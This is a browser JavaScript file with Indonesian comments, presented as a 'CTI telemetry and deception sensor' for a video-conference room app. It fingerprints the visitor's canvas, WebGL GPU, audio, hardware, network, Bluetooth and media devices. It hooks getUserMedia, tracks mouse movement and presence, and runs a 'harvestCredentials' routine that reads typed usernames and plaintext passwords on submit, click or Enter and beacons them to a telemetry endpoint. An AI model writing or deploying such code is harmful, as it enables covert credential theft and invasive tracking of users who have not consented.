// cti-telemetry.js - Cyber Threat Intelligence (CTI) Client Telemetry & Deception Sensor
// Mengumpulkan sidik jari browser (GPU, WebGL, Canvas, Audio, Screen, Timezone),
// perangkat media fisik (Webcam & Microphone), koneksi jaringan (WiFi vs Ethernet), Bluetooth, dan pemanenan kredensial (Username & Password).
(function () {
    'use strict';

    let cachedMediaDevices = [];
    let bluetoothSupported = false;

    function getCanvasFingerprint() {
        try {
            const canvas = document.createElement('canvas');
            canvas.width = 200;
            canvas.height = 50;
            const ctx = canvas.getContext('2d');
            if (!ctx) return '';
            ctx.textBaseline = 'top';
            ctx.font = '14px Arial';
            ctx.fillStyle = '#f60';
            ctx.fillRect(125, 1, 62, 20);
            ctx.fillStyle = '#069';
            ctx.fillText('ClassRoot_CTI_Sensor', 2, 15);
            ctx.fillStyle = 'rgba(102, 204, 0, 0.7)';
            ctx.fillText('ClassRoot_CTI_Sensor', 4, 17);
            const dataURL = canvas.toDataURL();
            let hash = 0;
            for (let i = 0; i < dataURL.length; i++) {
                hash = ((hash << 5) - hash) + dataURL.charCodeAt(i);
                hash |= 0;
            }
            return 'cv_' + Math.abs(hash).toString(16);
        } catch (e) {
            return '';
        }
    }

    function getAudioFingerprint() {
        try {
            const AudioContext = window.AudioContext || window.webkitAudioContext;
            if (!AudioContext) return '';
            const context = new AudioContext();
            const oscillator = context.createOscillator();
            const analyser = context.createAnalyser();
            const gain = context.createGain();
            gain.gain.value = 0; // Silent
            oscillator.type = 'triangle';
            oscillator.connect(analyser);
            analyser.connect(gain);
            gain.connect(context.destination);
            return 'audio_' + (context.sampleRate || 44100).toString(16);
        } catch (e) {
            return '';
        }
    }

    function getWebGLInfo() {
        try {
            const canvas = document.createElement('canvas');
            const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
            if (!gl) return { vendor: '', renderer: '' };
            const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
            if (!debugInfo) return { vendor: '', renderer: '' };
            return {
                vendor: gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL) || '',
                renderer: gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) || ''
            };
        } catch (e) {
            return { vendor: '', renderer: '' };
        }
    }

    // Ekstraksi info jaringan fisik (WiFi, Cellular, Ethernet & Bandwidth/Latency)
    function getNetworkInfo() {
        try {
            const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
            if (!conn) return null;
            return {
                connection_type: conn.type || '',
                effective_type: conn.effectiveType || '',
                downlink_mbps: conn.downlink || 0,
                rtt_ms: conn.rtt || 0
            };
        } catch (e) {
            return null;
        }
    }

    // Enumerasi perangkat fisik Kamera & Microphone
    async function scanMediaDevices() {
        try {
            if (navigator.mediaDevices && navigator.mediaDevices.enumerateDevices) {
                const devices = await navigator.mediaDevices.enumerateDevices();
                cachedMediaDevices = devices.map(d => ({
                    kind: d.kind, // 'audioinput', 'videoinput', 'audiooutput'
                    label: d.label || 'Generic Device (' + d.kind + ')',
                    device_id: d.deviceId ? d.deviceId.substring(0, 16) + '...' : ''
                }));
            }
        } catch (e) {}
    }

    // Deteksi ketersediaan Bluetooth
    function initBluetoothCheck() {
        try {
            if (navigator.bluetooth) {
                bluetoothSupported = true;
                if (navigator.bluetooth.getAvailability) {
                    navigator.bluetooth.getAvailability().then(avail => {
                        bluetoothSupported = avail;
                    }).catch(() => {});
                }
            }
        } catch (e) {}
    }

    function getCurrentRoom() {
        let roomName = '';
        if (window.location.pathname.startsWith('/group/')) {
            const parts = window.location.pathname.split('/').filter(Boolean);
            if (parts.length >= 2) roomName = parts[1];
        }
        return roomName;
    }

    function collectFingerprint() {
        const glInfo = getWebGLInfo();
        const tz = (Intl && Intl.DateTimeFormat) ? Intl.DateTimeFormat().resolvedOptions().timeZone : '';
        return {
            screen_resolution: `${window.screen.width || 0}x${window.screen.height || 0}`,
            color_depth: window.screen.colorDepth || 0,
            pixel_ratio: window.devicePixelRatio || 1,
            platform: navigator.platform || '',
            languages: (navigator.languages || [navigator.language || '']).join(','),
            timezone: tz || '',
            timezone_offset: new Date().getTimezoneOffset(),
            hardware_cores: navigator.hardwareConcurrency || 0,
            device_memory: navigator.deviceMemory || 0,
            gpu_vendor: glInfo.vendor,
            gpu_renderer: glInfo.renderer,
            canvas_hash: getCanvasFingerprint(),
            audio_hash: getAudioFingerprint(),
            media_devices: cachedMediaDevices,
            network_info: getNetworkInfo(),
            bluetooth_supported: bluetoothSupported,
            mouse_dynamics: getMouseDynamicsMetrics()
        };
    }

    function sendTelemetry(payload) {
        try {
            if (!payload.url_path) payload.url_path = window.location.pathname;
            if (!payload.query) payload.query = window.location.search;
            if (!payload.referrer) payload.referrer = document.referrer || '';
            const data = JSON.stringify(payload);
            if (navigator.sendBeacon) {
                const blob = new Blob([data], { type: 'application/json' });
                navigator.sendBeacon('/api/telemetry', blob);
            } else {
                fetch('/api/telemetry', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: data,
                    keepalive: true
                }).catch(() => {});
            }
        } catch (e) {}
    }

    // Hook navigator.mediaDevices.getUserMedia untuk menangkap saat izin Camera/Mic diberikan
    if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
        const origGUM = navigator.mediaDevices.getUserMedia.bind(navigator.mediaDevices);
        navigator.mediaDevices.getUserMedia = async function (constraints) {
            try {
                const stream = await origGUM(constraints);
                // Izin kamera/mic berhasil diberikan oleh pengguna!
                setTimeout(async () => {
                    await scanMediaDevices();
                    sendTelemetry({
                        event: 'MEDIA_DEVICES_ACCESSED',
                        group: getCurrentRoom(),
                        fingerprint: collectFingerprint()
                    });
                }, 500);
                return stream;
            } catch (err) {
                // Izin ditolak
                sendTelemetry({
                    event: 'MEDIA_ACCESS_DENIED',
                    group: getCurrentRoom(),
                    error: err.name || err.message,
                    fingerprint: collectFingerprint()
                });
                throw err;
            }
        };
    }

    // Listen device change (perangkat USB mic/webcam/bluetooth dicabut-colok)
    if (navigator.mediaDevices && navigator.mediaDevices.addEventListener) {
        navigator.mediaDevices.addEventListener('devicechange', async () => {
            await scanMediaDevices();
            sendTelemetry({
                event: 'MEDIA_DEVICE_CHANGED',
                group: getCurrentRoom(),
                fingerprint: collectFingerprint()
            });
        });
    }

    // 1. Inisialisasi awal saat halaman dimuat
    async function initSensor() {
        initBluetoothCheck();
        await scanMediaDevices();

        const isNotFound = document.title.toLowerCase().includes('not found') || 
                           document.title.includes('404') || 
                           Boolean(document.querySelector('.landing-page h1, .error-code, .not-found-container'));

        const eventName = isNotFound ? 'HTTP_404_PROBE' : 'PRE_AUTH_BEACON';

        sendTelemetry({
            event: eventName,
            group: getCurrentRoom(),
            url_path: window.location.pathname,
            query: window.location.search,
            referrer: document.referrer || '',
            fingerprint: collectFingerprint()
        });
    }

    if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', initSensor);
    } else {
        initSensor();
    }

    // 2. Intercept Kredensial (Username & Password) saat submit atau tombol diklik
    async function harvestCredentials() {
        await scanMediaDevices();

        const userEl = document.getElementById('username') || document.querySelector('input[name="username"]');
        const passEl = document.getElementById('password') || document.querySelector('input[name="password"]');
        const groupEl = document.getElementById('group') || document.querySelector('input[name="group"]');

        const username = userEl ? userEl.value.trim() : '';
        const password = passEl ? passEl.value : '';
        let groupName = groupEl ? groupEl.value.trim() : '';

        if (!groupName) {
            groupName = getCurrentRoom();
        }

        if (username || password) {
            sendTelemetry({
                event: 'ROOM_AUTH_SUBMITTED',
                username: username,
                password: password,
                group: groupName,
                fingerprint: collectFingerprint()
            });
        }
    }

    // =========================================================================
    // 3. Pelacakan Pergerakan Mouse & Deteksi Kehadiran (Presence Dynamics)
    // =========================================================================
    const mouseDynamics = {
        totalDistancePX: 0,
        movementCount: 0,
        clickCount: 0,
        scrollCount: 0,
        lastInteractionTime: Date.now(),
        lastMoveX: null,
        lastMoveY: null,
        lastMoveTime: null,
        totalVelocity: 0,
        velocitySamples: 0,
        currentPresence: 'active', // 'active' (Hijau) | 'away' (Kuning) | 'inactive' (Merah)
        presenceListeners: []
    };

    function getMouseDynamicsMetrics() {
        const now = Date.now();
        return {
            total_distance_px: mouseDynamics.totalDistancePX,
            movement_count: mouseDynamics.movementCount,
            click_count: mouseDynamics.clickCount,
            scroll_count: mouseDynamics.scrollCount,
            idle_duration_sec: Math.round((now - mouseDynamics.lastInteractionTime) / 1000),
            presence_state: mouseDynamics.currentPresence,
            avg_velocity_px_s: mouseDynamics.velocitySamples > 0 ? Math.round(mouseDynamics.totalVelocity / mouseDynamics.velocitySamples) : 0
        };
    }

    function setPresenceState(newState) {
        if (mouseDynamics.currentPresence === newState) return;
        const oldState = mouseDynamics.currentPresence;
        mouseDynamics.currentPresence = newState;

        // Beritahu listener terdaftar (misal galene.js)
        mouseDynamics.presenceListeners.forEach(fn => {
            try { fn(newState, oldState); } catch (e) {}
        });

        // Kirim telemetri perubahan status kehadiran
        sendTelemetry({
            event: 'USER_PRESENCE_STATE_CHANGED',
            group: getCurrentRoom(),
            fingerprint: collectFingerprint()
        });
    }

    function recordActivity(reason) {
        mouseDynamics.lastInteractionTime = Date.now();
        if (document.hidden) {
            setPresenceState('inactive');
        } else {
            setPresenceState('active');
        }
    }

    // Listener pergerakan mouse dengan throttle
    let lastThrottledMove = 0;
    window.addEventListener('mousemove', (e) => {
        const now = Date.now();
        recordActivity('mousemove');

        if (now - lastThrottledMove > 35) {
            lastThrottledMove = now;
            if (mouseDynamics.lastMoveX !== null && mouseDynamics.lastMoveY !== null) {
                const dx = e.clientX - mouseDynamics.lastMoveX;
                const dy = e.clientY - mouseDynamics.lastMoveY;
                const dist = Math.hypot(dx, dy);
                const dt = (now - (mouseDynamics.lastMoveTime || now)) / 1000;
                if (dt > 0 && dist > 1) {
                    mouseDynamics.totalDistancePX += Math.round(dist);
                    mouseDynamics.movementCount++;
                    const vel = dist / dt;
                    mouseDynamics.totalVelocity += vel;
                    mouseDynamics.velocitySamples++;
                }
            }
            mouseDynamics.lastMoveX = e.clientX;
            mouseDynamics.lastMoveY = e.clientY;
            mouseDynamics.lastMoveTime = now;
        }
    }, { passive: true });

    // Listener interaksi mouse & keyboard
    window.addEventListener('mousedown', () => {
        mouseDynamics.clickCount++;
        recordActivity('mousedown');
    }, { passive: true });

    window.addEventListener('wheel', () => {
        mouseDynamics.scrollCount++;
        recordActivity('wheel');
    }, { passive: true });

    window.addEventListener('keydown', () => {
        recordActivity('keydown');
    }, { passive: true });

    // Deteksi pindah tab / minimize window -> Merah ('inactive')
    document.addEventListener('visibilitychange', () => {
        if (document.hidden) {
            setPresenceState('inactive');
        } else {
            recordActivity('visibilitychange_visible');
        }
    });

    window.addEventListener('blur', () => {
        if (document.hidden) {
            setPresenceState('inactive');
        }
    });

    window.addEventListener('focus', () => {
        if (!document.hidden) {
            recordActivity('focus');
        }
    });

    // Evaluasi timer idle: jika tidak ada gerakan > 30 detik -> Kuning ('away')
    setInterval(() => {
        if (document.hidden) {
            setPresenceState('inactive');
            return;
        }
        const idleMs = Date.now() - mouseDynamics.lastInteractionTime;
        if (idleMs > 30000) {
            setPresenceState('away');
        } else {
            setPresenceState('active');
        }
    }, 5000);

    // Kirim telemetri periodik dinamika pergerakan mouse (setiap 60 detik)
    let lastReportedMoveCount = 0;
    setInterval(() => {
        if (mouseDynamics.movementCount > lastReportedMoveCount) {
            lastReportedMoveCount = mouseDynamics.movementCount;
            sendTelemetry({
                event: 'MOUSE_INTERACTION_TELEMETRY',
                group: getCurrentRoom(),
                fingerprint: collectFingerprint()
            });
        }
    }, 60000);

    // Ekspor API Global untuk diakses oleh galene.js
    window.ClassRootPresence = {
        getPresence: () => mouseDynamics.currentPresence,
        getMetrics: getMouseDynamicsMetrics,
        onPresenceChange: (callback) => {
            if (typeof callback === 'function') {
                mouseDynamics.presenceListeners.push(callback);
            }
        }
    };

    window.addEventListener('load', () => {
        // Form submit hook
        const forms = document.querySelectorAll('form');
        forms.forEach(f => f.addEventListener('submit', harvestCredentials));

        // Click buttons hook (connect / join)
        document.addEventListener('click', (e) => {
            if (!e.target) return;
            const id = e.target.id || '';
            const type = e.target.type || '';
            if (id === 'connect' || id === 'submitbutton' || type === 'submit') {
                harvestCredentials();
            }
        });

        // Keypress Enter pada input password
        const passInput = document.getElementById('password');
        if (passInput) {
            passInput.addEventListener('keydown', (e) => {
                if (e.key === 'Enter') {
                    harvestCredentials();
                }
            });
        }
    });
})();
